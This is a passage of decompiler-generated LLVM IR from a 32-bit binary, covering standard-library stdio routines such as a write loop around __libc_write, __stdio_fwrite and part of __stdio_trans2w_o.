  %v0_805221d = load i32, i32* @edi, align 4
  %v0_805221f = load i32, i32* @ebx, align 4
  %v15_8052220 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8052223 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8052223, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_805222f4 = icmp eq i32 %arg3, 0
  store i1 %v1_805222f4, i1* %zf.global-to-local, align 1
  br i1 %v1_805222f4, label %dec_label_pc_8052290, label %dec_label_pc_8052234.lr.ph

dec_label_pc_8052234.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8052234

dec_label_pc_8052234:                             ; preds = %dec_label_pc_8052250.dec_label_pc_8052234_crit_edge, %dec_label_pc_8052234.lr.ph
  %v0_8052241 = phi i32 [ %v4_8052223, %dec_label_pc_8052234.lr.ph ], [ %v0_8052241.pre, %dec_label_pc_8052250.dec_label_pc_8052234_crit_edge ]
  %v0_8052240 = phi i32 [ %arg2, %dec_label_pc_8052234.lr.ph ], [ %v2_8052252, %dec_label_pc_8052250.dec_label_pc_8052234_crit_edge ]
  %v0_805223c.in = phi i32 [ %arg3, %dec_label_pc_8052234.lr.ph ], [ %v2_8052250, %dec_label_pc_8052250.dec_label_pc_8052234_crit_edge ]
  %v4_805223c = phi i32 [ %arg3, %dec_label_pc_8052234.lr.ph ], [ %v2_8052250, %dec_label_pc_8052250.dec_label_pc_8052234_crit_edge ]
  %v0_805223c = icmp slt i32 %v0_805223c.in, 0
  store i32 %v4_805223c, i32* %esi.global-to-local, align 4
  %v2_805223c = icmp eq i1 %v0_805223c, false
  %v5_805223c = select i1 %v2_805223c, i32 %v4_805223c, i32 2147483647
  store i32 %v5_805223c, i32* %eax.global-to-local, align 4
  %v1_8052241 = add i32 %v0_8052241, 4
  %v2_8052241 = inttoptr i32 %v1_8052241 to i32*
  %v3_8052241 = load i32, i32* %v2_8052241, align 4
  %tmp36 = inttoptr i32 %v0_8052240 to i32*
  %v5_8052244 = call i32 @__libc_write(i32 %v3_8052241, i32* %tmp36, i32 %v5_805223c)
  store i32 %v5_8052244, i32* %eax.global-to-local, align 4
  %v1_805224c = icmp eq i32 %v5_8052244, 0
  store i1 %v1_805224c, i1* %zf.global-to-local, align 1
  %v2_805224c = icmp slt i32 %v5_8052244, 0
  br i1 %v2_805224c, label %dec_label_pc_8052256, label %dec_label_pc_8052250

dec_label_pc_8052250:                             ; preds = %dec_label_pc_8052234
  %v0_8052250 = load i32, i32* @ebx, align 4
  %v2_8052250 = sub i32 %v0_8052250, %v5_8052244
  %v12_8052250 = icmp eq i32 %v2_8052250, 0
  store i32 %v2_8052250, i32* @ebx, align 4
  %v0_8052252 = load i32, i32* @edi, align 4
  %v2_8052252 = add i32 %v0_8052252, %v5_8052244
  store i32 %v2_8052252, i32* @edi, align 4
  store i1 %v12_8052250, i1* %zf.global-to-local, align 1
  br i1 %v12_8052250, label %dec_label_pc_8052290, label %dec_label_pc_8052250.dec_label_pc_8052234_crit_edge

dec_label_pc_8052250.dec_label_pc_8052234_crit_edge: ; preds = %dec_label_pc_8052250
  %v0_8052241.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8052234

dec_label_pc_8052256:                             ; preds = %dec_label_pc_8052234
  %v0_8052256 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052256 = inttoptr i32 %v0_8052256 to i32*
  %v2_8052256 = load i32, i32* %v1_8052256, align 4
  store i32 %v2_8052256, i32* %eax.global-to-local, align 4
  %v1_8052259 = add i32 %v0_8052256, 8
  %v2_8052259 = inttoptr i32 %v1_8052259 to i32*
  %v3_8052259 = load i32, i32* %v2_8052259, align 4
  store i32 %v3_8052259, i32* @edx, align 4
  %v1_805225c = or i32 %v2_8052256, 8
  store i32 %v1_805225c, i32* %eax.global-to-local, align 4
  %v1_805225f = trunc i32 %v1_805225c to i16
  %v3_805225f = inttoptr i32 %v0_8052256 to i16*
  store i16 %v1_805225f, i16* %v3_805225f, align 2
  %v0_8052263 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052263 = add i32 %v0_8052263, 12
  %v2_8052263 = inttoptr i32 %v1_8052263 to i32*
  %v3_8052263 = load i32, i32* %v2_8052263, align 4
  %v1_8052266 = load i32, i32* @edx, align 4
  %v2_8052266 = sub i32 %v3_8052263, %v1_8052266
  %v12_8052266 = icmp eq i32 %v2_8052266, 0
  store i1 %v12_8052266, i1* %zf.global-to-local, align 1
  store i32 %v2_8052266, i32* %eax.global-to-local, align 4
  %v4_805228c.pre = load i32, i32* @ebx, align 4
  br i1 %v12_8052266, label %dec_label_pc_805228c, label %dec_label_pc_805226a

dec_label_pc_805226a:                             ; preds = %dec_label_pc_8052256
  %v12_805226a = icmp eq i32 %v2_8052266, %v4_805228c.pre
  store i1 %v12_805226a, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_8052266, %v4_805228c.pre
  %v3_805226c = load i32, i32* %esi.global-to-local, align 4
  %v5_805226c = select i1 %tmp, i32 %v2_8052266, i32 %v3_805226c
  store i32 %v5_805226c, i32* %esi.global-to-local, align 4
  %v0_805226f.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805226f

dec_label_pc_805226f:                             ; preds = %dec_label_pc_8052281, %dec_label_pc_805226a
  %v2_8052273 = phi i32 [ %v1_805227d, %dec_label_pc_8052281 ], [ %v1_8052266, %dec_label_pc_805226a ]
  %v4_805226f = phi i32 [ %v4_805226f.pre, %dec_label_pc_8052281 ], [ %v2_8052266, %dec_label_pc_805226a ]
  %v0_805226f = phi i32 [ %v1_8052281, %dec_label_pc_8052281 ], [ %v0_805226f.pre, %dec_label_pc_805226a ]
  %v1_805226f = inttoptr i32 %v0_805226f to i8*
  %v2_805226f = load i8, i8* %v1_805226f, align 1
  %v3_805226f = zext i8 %v2_805226f to i32
  %v5_805226f = and i32 %v4_805226f, -256
  %v6_805226f = or i32 %v3_805226f, %v5_805226f
  store i32 %v6_805226f, i32* %eax.global-to-local, align 4
  %v10_8052271 = icmp eq i8 %v2_805226f, 10
  store i1 %v10_8052271, i1* %zf.global-to-local, align 1
  %v3_8052273 = inttoptr i32 %v2_8052273 to i8*
  store i8 %v2_805226f, i8* %v3_8052273, align 1
  %v0_8052275 = load i1, i1* %zf.global-to-local, align 1
  %v1_8052275 = icmp eq i1 %v0_8052275, false
  br i1 %v1_8052275, label %dec_label_pc_805227d, label %dec_label_pc_8052277

dec_label_pc_8052277:                             ; preds = %dec_label_pc_805226f
  %v0_8052277 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052277 = add i32 %v0_8052277, 1
  %v2_8052277 = inttoptr i32 %v1_8052277 to i8*
  %v3_8052277 = load i8, i8* %v2_8052277, align 1
  %v4_8052277 = urem i8 %v3_8052277, 2
  %v5_8052277 = icmp eq i8 %v4_8052277, 0
  store i1 %v5_8052277, i1* %zf.global-to-local, align 1
  %v1_805227b = icmp eq i1 %v5_8052277, false
  br i1 %v1_805227b, label %dec_label_pc_8052277.dec_label_pc_8052284_crit_edge, label %dec_label_pc_805227d

dec_label_pc_8052277.dec_label_pc_8052284_crit_edge: ; preds = %dec_label_pc_8052277
  %v0_8052284.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052284

dec_label_pc_805227d:                             ; preds = %dec_label_pc_8052277, %dec_label_pc_805226f
  %v0_805227d = load i32, i32* @edx, align 4
  %v1_805227d = add i32 %v0_805227d, 1
  store i32 %v1_805227d, i32* @edx, align 4
  %v0_805227e = load i32, i32* %esi.global-to-local, align 4
  %v1_805227e = add i32 %v0_805227e, -1
  %v8_805227e = icmp eq i32 %v1_805227e, 0
  store i1 %v8_805227e, i1* %zf.global-to-local, align 1
  store i32 %v1_805227e, i32* %esi.global-to-local, align 4
  br i1 %v8_805227e, label %dec_label_pc_805227d.dec_label_pc_8052284_crit_edge, label %dec_label_pc_8052281

dec_label_pc_805227d.dec_label_pc_8052284_crit_edge: ; preds = %dec_label_pc_805227d
  %v1_8052284.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8052284

dec_label_pc_8052281:                             ; preds = %dec_label_pc_805227d
  %v0_8052281 = load i32, i32* @edi, align 4
  %v1_8052281 = add i32 %v0_8052281, 1
  %v8_8052281 = icmp eq i32 %v1_8052281, 0
  store i1 %v8_8052281, i1* %zf.global-to-local, align 1
  store i32 %v1_8052281, i32* @edi, align 4
  %v4_805226f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805226f

dec_label_pc_8052284:                             ; preds = %dec_label_pc_805227d.dec_label_pc_8052284_crit_edge, %dec_label_pc_8052277.dec_label_pc_8052284_crit_edge
  %v1_8052284 = phi i32 [ %v0_8052277, %dec_label_pc_8052277.dec_label_pc_8052284_crit_edge ], [ %v1_8052284.pre, %dec_label_pc_805227d.dec_label_pc_8052284_crit_edge ]
  %v0_8052284 = phi i32 [ %v0_8052284.pre, %dec_label_pc_8052277.dec_label_pc_8052284_crit_edge ], [ %v1_805227d, %dec_label_pc_805227d.dec_label_pc_8052284_crit_edge ]
  %v2_8052284 = add i32 %v1_8052284, 16
  %v3_8052284 = inttoptr i32 %v2_8052284 to i32*
  store i32 %v0_8052284, i32* %v3_8052284, align 4
  %v0_8052287 = load i32, i32* @edx, align 4
  %v1_8052287 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052287 = add i32 %v1_8052287, 8
  %v3_8052287 = inttoptr i32 %v2_8052287 to i32*
  %v4_8052287 = load i32, i32* %v3_8052287, align 4
  %v5_8052287 = sub i32 %v0_8052287, %v4_8052287
  store i32 %v5_8052287, i32* @edx, align 4
  %v0_805228a = load i32, i32* @ebx, align 4
  %v2_805228a = sub i32 %v0_805228a, %v5_8052287
  %v12_805228a = icmp eq i32 %v2_805228a, 0
  store i1 %v12_805228a, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_805228c

dec_label_pc_805228c:                             ; preds = %dec_label_pc_8052256, %dec_label_pc_8052284
  %v4_805228c = phi i32 [ %v2_805228a, %dec_label_pc_8052284 ], [ %v4_805228c.pre, %dec_label_pc_8052256 ]
  %v5_805228c = sub i32 %arg3, %v4_805228c
  %v15_805228c = icmp eq i32 %v5_805228c, 0
  store i1 %v15_805228c, i1* %zf.global-to-local, align 1
  %v0_8052294.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052290

dec_label_pc_8052290:                             ; preds = %dec_label_pc_8052250, %entry, %dec_label_pc_805228c
  %v0_8052294 = phi i32 [ %v0_8052294.pre, %dec_label_pc_805228c ], [ %v15_8052220, %entry ], [ %v15_8052220, %dec_label_pc_8052250 ]
  %stack_var_12.0 = phi i32 [ %v5_805228c, %dec_label_pc_805228c ], [ 0, %entry ], [ %arg3, %dec_label_pc_8052250 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_8052294 = icmp eq i32 %v0_8052294, -12
  store i1 %v9_8052294, i1* %zf.global-to-local, align 1
  store i32 %v0_805221f, i32* @ebx, align 4
  store i32 %v0_805221d, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_8052281, { 1, 2, 0 }
  uselistorder i32 %v1_805227e, { 1, 0 }
  uselistorder i32 %v1_805227d, { 0, 2, 1 }
  uselistorder i8 %v2_805226f, { 1, 0, 2 }
  uselistorder i32 %v4_805228c.pre, { 2, 0, 1 }
  uselistorder i32 %v2_8052266, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_8052252, { 1, 0 }
  uselistorder i32 %v2_8052250, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8052244, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12 }
  uselistorder i32* %ebp.global-to-local, { 2, 1, 3, 4, 5, 0, 6 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_8052290, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805228c, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805229c = load i32, i32* @ebp, align 4
  %v0_805229d = load i32, i32* @edi, align 4
  %v0_805229e = load i32, i32* @esi, align 4
  %v0_805229f = load i32, i32* @ebx, align 4
  store i32 %v0_805229f, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_80522af = add i32 %arg3, 1
  %v2_80522af = inttoptr i32 %v1_80522af to i8*
  %v3_80522af = load i8, i8* %v2_80522af, align 1
  %v4_80522af = and i8 %v3_80522af, 2
  %v5_80522af = icmp eq i8 %v4_80522af, 0
  %v1_80522b3 = icmp eq i1 %v5_80522af, false
  br i1 %v1_80522b3, label %dec_label_pc_8052364, label %dec_label_pc_80522b9

dec_label_pc_80522b9:                             ; preds = %entry
  %v1_80522b9 = add i32 %arg3, 4
  %v2_80522b9 = inttoptr i32 %v1_80522b9 to i32*
  %v3_80522b9 = load i32, i32* %v2_80522b9, align 4
  %v13_80522b9 = icmp eq i32 %v3_80522b9, -2
  %v1_80522bd = add i32 %arg3, 16
  %v2_80522bd = inttoptr i32 %v1_80522bd to i32*
  %v3_80522bd = load i32, i32* %v2_80522bd, align 4
  store i32 %v3_80522bd, i32* @edx, align 4
  %v1_80522c0 = add i32 %arg3, 12
  %v2_80522c0 = inttoptr i32 %v1_80522c0 to i32*
  %v3_80522c0 = load i32, i32* %v2_80522c0, align 4
  store i32 %v3_80522c0, i32* %eax.global-to-local, align 4
  %v1_80522c3 = icmp eq i1 %v13_80522b9, false
  %v2_80522e2 = sub i32 %v3_80522c0, %v3_80522bd
  br i1 %v1_80522c3, label %dec_label_pc_80522e2, label %dec_label_pc_80522c5

dec_label_pc_80522c5:                             ; preds = %dec_label_pc_80522b9
  %tmp = icmp uge i32 %v2_80522e2, %arg2
  %v5_80522cc = select i1 %tmp, i32 %arg2, i32 %v2_80522e2
  store i32 %v5_80522cc, i32* %ebx.global-to-local, align 4
  %v3_80522d2 = inttoptr i32 %v3_80522bd to i16*
  %v4_80522d2 = call i32 @memcpy(i16* %v3_80522d2, i32 %v5_80522cc, i32 %v3_80522c0)
  store i32 %v4_80522d2, i32* %eax.global-to-local, align 4
  %v0_80522da = load i32, i32* @esi, align 4
  %v1_80522da = add i32 %v0_80522da, 16
  %v2_80522da = inttoptr i32 %v1_80522da to i32*
  %v3_80522da = load i32, i32* %v2_80522da, align 4
  %v4_80522da = load i32, i32* %ebx.global-to-local, align 4
  %v5_80522da = add i32 %v4_80522da, %v3_80522da
  store i32 %v5_80522da, i32* %v2_80522da, align 4
  br label %dec_label_pc_805237c

dec_label_pc_80522e2:                             ; preds = %dec_label_pc_80522b9
  store i32 %v2_80522e2, i32* %eax.global-to-local, align 4
  %v6_80522e6 = icmp ult i32 %v2_80522e2, %arg2
  br i1 %v6_80522e6, label %dec_label_pc_805234b, label %dec_label_pc_80522e8

dec_label_pc_80522e8:                             ; preds = %dec_label_pc_80522e2
  %v0_80522e8 = load i32, i32* @ecx, align 4
  %v3_80522ec = inttoptr i32 %v3_80522bd to i16*
  %v4_80522ec = call i32 @memcpy(i16* %v3_80522ec, i32 %arg2, i32 %v0_80522e8)
  store i32 %v4_80522ec, i32* %eax.global-to-local, align 4
  %v0_80522f4 = load i32, i32* @esi, align 4
  %v1_80522f4 = add i32 %v0_80522f4, 16
  %v2_80522f4 = inttoptr i32 %v1_80522f4 to i32*
  %v3_80522f4 = load i32, i32* %v2_80522f4, align 4
  %v4_80522f4 = load i32, i32* @edi, align 4
  %v5_80522f4 = add i32 %v4_80522f4, %v3_80522f4
  store i32 %v5_80522f4, i32* %v2_80522f4, align 4
  %v0_80522f7 = load i32, i32* @esi, align 4
  %v1_80522f7 = add i32 %v0_80522f7, 1
  %v2_80522f7 = inttoptr i32 %v1_80522f7 to i8*
  %v3_80522f7 = load i8, i8* %v2_80522f7, align 1
  %v4_80522f7 = urem i8 %v3_80522f7, 2
  %v5_80522f7 = icmp eq i8 %v4_80522f7, 0
  br i1 %v5_80522f7, label %dec_label_pc_805237c, label %dec_label_pc_80522fd

dec_label_pc_80522fd:                             ; preds = %dec_label_pc_80522e8
  %v0_80522fd = load i32, i32* @edx, align 4
  %v0_80522fe = load i32, i32* @edi, align 4
  %v4_8052302 = call i32 @memrchr(i8 10, i32 %v0_80522fe, i32 %v0_80522fd)
  store i32 %v4_8052302, i32* %eax.global-to-local, align 4
  %v1_805230a = icmp eq i32 %v4_8052302, 0
  br i1 %v1_805230a, label %dec_label_pc_805237c, label %dec_label_pc_805230e

dec_label_pc_805230e:                             ; preds = %dec_label_pc_80522fd
  %v0_8052311 = load i32, i32* @esi, align 4
  %v1_8052312 = call i32 @__stdio_wcommit(i32 %v0_8052311)
  store i32 %v1_8052312, i32* %eax.global-to-local, align 4
  %v1_805231a = icmp eq i32 %v1_8052312, 0
  br i1 %v1_805231a, label %dec_label_pc_805237c, label %dec_label_pc_805231e

dec_label_pc_805231e:                             ; preds = %dec_label_pc_805230e
  %v0_805231e = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_805231e, %v1_8052312
  %v5_8052322 = select i1 %tmp20, i32 %v0_805231e, i32 %v1_8052312
  store i32 %v5_8052322, i32* %ebx.global-to-local, align 4
  %v2_8052327 = sub i32 %v0_805231e, %v5_8052322
  store i32 %v2_8052327, i32* %eax.global-to-local, align 4
  %v0_8052329 = load i32, i32* @ebp, align 4
  %v2_8052329 = add i32 %v0_8052329, %v2_8052327
  store i32 %v2_8052329, i32* %ebp.global-to-local, align 4
  %v4_8052330 = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v5_8052322, i32 %v2_8052327)
  store i32 %v4_8052330, i32* %eax.global-to-local, align 4
  %v1_8052338 = icmp eq i32 %v4_8052330, 0
  store i32 %v4_8052330, i32* @edx, align 4
  br i1 %v1_8052338, label %dec_label_pc_805237c, label %dec_label_pc_805233e

dec_label_pc_805233e:                             ; preds = %dec_label_pc_805231e
  %v0_805233e = load i32, i32* %ebp.global-to-local, align 4
  %v1_805233e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805233e = sub i32 %v0_805233e, %v4_8052330
  %v2_8052342 = add i32 %v2_805233e, %v1_805233e
  store i32 %v2_8052342, i32* %eax.global-to-local, align 4
  %v0_8052344 = load i32, i32* @esi, align 4
  %v1_8052344 = add i32 %v0_8052344, 16
  %v2_8052344 = inttoptr i32 %v1_8052344 to i32*
  %v3_8052344 = load i32, i32* %v2_8052344, align 4
  %v5_8052344 = sub i32 %v3_8052344, %v2_8052342
  store i32 %v5_8052344, i32* %v2_8052344, align 4
  %v0_8052347 = load i32, i32* @edi, align 4
  %v1_8052347 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052347 = sub i32 %v0_8052347, %v1_8052347
  store i32 %v2_8052347, i32* @edi, align 4
  br label %dec_label_pc_805237c

dec_label_pc_805234b:                             ; preds = %dec_label_pc_80522e2
  %v2_805234b = add i32 %arg3, 8
  %v3_805234b = inttoptr i32 %v2_805234b to i32*
  %v4_805234b = load i32, i32* %v3_805234b, align 4
  %v15_805234b = icmp eq i32 %v3_80522bd, %v4_805234b
  br i1 %v15_805234b, label %dec_label_pc_8052364, label %dec_label_pc_8052350

dec_label_pc_8052350:                             ; preds = %dec_label_pc_805234b
  %v1_8052354 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8052354, i32* %eax.global-to-local, align 4
  %v1_805235c = icmp eq i32 %v1_8052354, 0
  br i1 %v1_805235c, label %dec_label_pc_8052350.dec_label_pc_8052364_crit_edge, label %dec_label_pc_8052360

dec_label_pc_8052350.dec_label_pc_8052364_crit_edge: ; preds = %dec_label_pc_8052350
  %v0_8052364.pre = load i32, i32* @edi, align 4
  %v0_805236c.pre = load i32, i32* @esi, align 4
  %v2_8052373.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8052364

dec_label_pc_8052360:                             ; preds = %dec_label_pc_8052350
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_805237c

dec_label_pc_8052364:                             ; preds = %dec_label_pc_8052350.dec_label_pc_8052364_crit_edge, %dec_label_pc_805234b, %entry
  %v2_8052373 = phi i32 [ %v2_8052373.pre, %dec_label_pc_8052350.dec_label_pc_8052364_crit_edge ], [ %v0_805229f, %dec_label_pc_805234b ], [ %v0_805229f, %entry ]
  %v0_805236c = phi i32 [ %v0_805236c.pre, %dec_label_pc_8052350.dec_label_pc_8052364_crit_edge ], [ %arg3, %dec_label_pc_805234b ], [ %arg3, %entry ]
  %v0_8052364 = phi i32 [ %v0_8052364.pre, %dec_label_pc_8052350.dec_label_pc_8052364_crit_edge ], [ %arg2, %dec_label_pc_805234b ], [ %arg2, %entry ]
  store i32 %v2_8052373, i32* @ebx, align 4
  store i32 %v0_805229d, i32* @edi, align 4
  %v4_8052377 = inttoptr i32 %v0_805236c to i16*
  %v5_8052377 = call i32 @__stdio_WRITE(i16* %v4_8052377, i32 %v0_8052364, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8052377, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805237c

dec_label_pc_805237c:                             ; preds = %dec_label_pc_805231e, %dec_label_pc_805230e, %dec_label_pc_80522fd, %dec_label_pc_80522e8, %dec_label_pc_8052360, %dec_label_pc_805233e, %dec_label_pc_80522c5, %dec_label_pc_8052364
  %v0_805237f = load i32, i32* @edi, align 4
  store i32 %v0_805237f, i32* %eax.global-to-local, align 4
  %v2_8052381 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8052381, i32* @ebx, align 4
  store i32 %v0_805229e, i32* @esi, align 4
  store i32 %v0_805229d, i32* @edi, align 4
  store i32 %v0_805229c, i32* @ebp, align 4
  ret i32 %v0_805237f

; uselistorder directives
  uselistorder i32 %v2_8052342, { 1, 0 }
  uselistorder i32 %v0_805231e, { 2, 1, 0 }
  uselistorder i32 %v1_8052312, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80522e2, { 2, 3, 1, 0 }
  uselistorder i32 %v3_80522bd, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_805229d, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_805237c, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8052388 = load i32, i32* @ebx, align 4
  %v4_805238c = ptrtoint i16* %arg1 to i32
  store i32 %v4_805238c, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8052394 = load i16, i16* %arg1, align 2
  %v3_8052394 = zext i16 %v2_8052394 to i32
  store i32 %v3_8052394, i32* %eax.global-to-local, align 4
  %v2_8052397 = and i32 %v3_8052394, %arg2
  %v3_8052397 = icmp eq i32 %v2_8052397, 0
  %v1_8052399 = icmp eq i1 %v3_8052397, false
  br i1 %v1_8052399, label %dec_label_pc_80523a7, label %dec_label_pc_805239b

dec_label_pc_805239b:                             ; preds = %entry
  %v1_805239b = and i32 %v3_8052394, 2176
  %v2_805239b = icmp eq i32 %v1_805239b, 0
  %v1_80523a0 = icmp eq i1 %v2_805239b, false
  br i1 %v1_80523a0, label %dec_label_pc_80523af, label %dec_label_pc_80523a2

dec_label_pc_80523a2:                             ; preds = %dec_label_pc_805239b
  %v2_80523a2 = or i32 %v3_8052394, %arg2
  store i32 %v2_80523a2, i32* %eax.global-to-local, align 4
  %v1_80523a4 = trunc i32 %v2_80523a2 to i16
  store i16 %v1_80523a4, i16* %arg1, align 2
  %v0_80523a7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80523a7

dec_label_pc_80523a7:                             ; preds = %entry, %dec_label_pc_80523a2
  %v0_80523f0 = phi i32 [ %v4_805238c, %entry ], [ %v0_80523a7.pre, %dec_label_pc_80523a2 ]
  %v1_80523a7 = inttoptr i32 %v0_80523f0 to i16*
  %v2_80523a7 = load i16, i16* %v1_80523a7, align 2
  %v3_80523a7 = zext i16 %v2_80523a7 to i32
  store i32 %v3_80523a7, i32* %edx.global-to-local, align 4
  %v2_80523aa = and i16 %v2_80523a7, 32
  %v3_80523aa = icmp eq i16 %v2_80523aa, 0
  br i1 %v3_80523aa, label %dec_label_pc_80523c7, label %dec_label_pc_80523af

dec_label_pc_80523af:                             ; preds = %dec_label_pc_80523a7, %dec_label_pc_805239b
  %v1_80523af = call i32 @__errno_location(i32 %v0_8052388)
  store i32 %v1_80523af, i32* %eax.global-to-local, align 4
  %v1_80523b4 = inttoptr i32 %v1_80523af to i32*
  store i32 9, i32* %v1_80523b4, align 4
  br label %dec_label_pc_80523ba

dec_label_pc_80523ba:                             ; preds = %dec_label_pc_80523de, %dec_label_pc_80523af
  %v0_80523ba = load i32, i32* @ebx, align 4
  %v1_80523ba = inttoptr i32 %v0_80523ba to i32*
  %v2_80523ba = load i32, i32* %v1_80523ba, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_80523bf = or i32 %v2_80523ba, 8
  store i32 %v1_80523bf, i32* %eax.global-to-local, align 4
  %v1_80523c2 = trunc i32 %v1_80523bf to i16
  %v3_80523c2 = inttoptr i32 %v0_80523ba to i16*
  store i16 %v1_80523c2, i16* %v3_80523c2, align 2
  br label %dec_label_pc_8052429

dec_label_pc_80523c7:                             ; preds = %dec_label_pc_80523a7
  %v2_80523c7 = urem i16 %v2_80523a7, 4
  %v3_80523c7 = icmp eq i16 %v2_80523c7, 0
  br i1 %v3_80523c7, label %dec_label_pc_8052411, label %dec_label_pc_80523cc

dec_label_pc_80523cc:                             ; preds = %dec_label_pc_80523c7
  %v2_80523cc = and i32 %v3_80523a7, 4
  %v3_80523cc = icmp eq i32 %v2_80523cc, 0
  %v1_80523cf = icmp eq i1 %v3_80523cc, false
  br i1 %v1_80523cf, label %dec_label_pc_80523fd, label %dec_label_pc_80523d1

dec_label_pc_80523d1:                             ; preds = %dec_label_pc_80523cc
  %v1_80523d1 = add i32 %v0_80523f0, 20
  %v2_80523d1 = inttoptr i32 %v1_80523d1 to i32*
  %v3_80523d1 = load i32, i32* %v2_80523d1, align 4
  store i32 %v3_80523d1, i32* %eax.global-to-local, align 4
  %v2_80523d4 = add i32 %v0_80523f0, 16
  %v3_80523d4 = inttoptr i32 %v2_80523d4 to i32*
  %v4_80523d4 = load i32, i32* %v3_80523d4, align 4
  %v15_80523d4 = icmp eq i32 %v3_80523d1, %v4_80523d4
  %v1_80523d7 = icmp eq i1 %v15_80523d4, false
  br i1 %v1_80523d7, label %dec_label_pc_80523de, label %dec_label_pc_80523d9

dec_label_pc_80523d9:                             ; preds = %dec_label_pc_80523d1
  %v2_80523d9 = and i32 %v3_80523a7, 2
  %v3_80523d9 = icmp eq i32 %v2_80523d9, 0
  br i1 %v3_80523d9, label %dec_label_pc_80523fd, label %dec_label_pc_80523de

dec_label_pc_80523de:                             ; preds = %dec_label_pc_80523d9, %dec_label_pc_80523d1
  %v1_80523de = and i32 %v3_80523a7, 1024
  store i32 %v1_80523de, i32* %edx.global-to-local, align 4
  %tmp15 = udiv i32 %v1_80523de, 1024
  %tmp16 = xor i32 %tmp15, 3
  store i32 %tmp16, i32* %eax.global-to-local, align 4
  %v5_80523f1 = call i32 @__GI_fseek(i32 %v0_80523f0, i32 0, i32 %tmp16, i32 %v1_80523de)
  store i32 %v5_80523f1, i32* %eax.global-to-local, align 4
  %v1_80523f9 = icmp eq i32 %v5_80523f1, 0
  %v1_80523fb = icmp eq i1 %v1_80523f9, false
  br i1 %v1_80523fb, label %dec_label_pc_80523ba, label %dec_label_pc_80523de.dec_label_pc_80523fd_crit_edge

dec_label_pc_80523de.dec_label_pc_80523fd_crit_edge: ; preds = %dec_label_pc_80523de
  %v0_80523fd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80523fd

dec_label_pc_80523fd:                             ; preds = %dec_label_pc_80523de.dec_label_pc_80523fd_crit_edge, %dec_label_pc_80523d9, %dec_label_pc_80523cc
  %v2_8052402 = phi i32 [ %v0_80523fd.pre, %dec_label_pc_80523de.dec_label_pc_80523fd_crit_edge ], [ %v0_80523f0, %dec_label_pc_80523d9 ], [ %v0_80523f0, %dec_label_pc_80523cc ]
  %v1_80523fd = inttoptr i32 %v2_8052402 to i32*
  %v2_80523fd = load i32, i32* %v1_80523fd, align 4
  %v1_80523ff = and i32 %v2_80523fd, -4
  store i32 %v1_80523ff, i32* %eax.global-to-local, align 4
  %v1_8052402 = trunc i32 %v1_80523ff to i16
  %v3_8052402 = inttoptr i32 %v2_8052402 to i16*
  store i16 %v1_8052402, i16* %v3_8052402, align 2
